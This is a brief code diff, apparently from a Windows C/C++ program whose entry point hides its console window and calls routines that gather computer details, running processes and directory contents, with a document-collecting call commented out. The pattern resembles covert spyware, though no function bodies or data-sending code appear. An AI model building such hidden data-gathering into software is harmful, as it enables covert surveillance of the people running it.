@@ -9,11 +9,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
-    //DirCheck(); At Rework Progress
+    
     //GetAllDocs();
     DetailedComputerInfo();
     GetProcessInfo();
-
+    DirCheck();
 
     return 0;
 }
@@ -22,5 +22,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 int main() { 
     DetailedComputerInfo();
     GetProcessInfo();
+    DirCheck();
     system("pause>nul");
 }
